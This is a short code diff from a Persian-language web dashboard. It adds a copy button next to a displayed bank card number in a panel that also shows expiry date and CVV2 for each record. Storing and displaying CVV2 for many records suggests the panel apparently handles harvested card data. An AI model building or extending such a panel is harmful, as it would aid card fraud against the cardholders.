@@ -623,7 +623,7 @@ function renderMain(){
       <div style="margin-top:8px">
         <button class="mini danger" onclick="toggleCard('card_${d.id}',this)">👁 نمایش کارت بانکی</button>
         <div id="card_${d.id}" class="hidden" style="display:grid;grid-template-columns:1.4fr 1fr 1fr 1fr 1fr;gap:6px;margin-top:6px">
-          <div class="info-cell">شماره: <b class="ltr">${esc(c.num||'—')}</b></div>
+          <div class="info-cell">شماره: <b class="ltr">${esc(c.num||'—')}</b> <button class="copy-btn" onclick="copyText('${esc(c.num||'')}',this)">📋</button></div>
           <div class="info-cell">ماه: <b class="ltr">${esc(c.m||'--')}</b></div>
           <div class="info-cell">سال: <b class="ltr">${esc(c.y||'--')}</b></div>
           <div class="info-cell">CVV2: <b class="ltr">${esc(c.cvv2||'—')}</b></div>
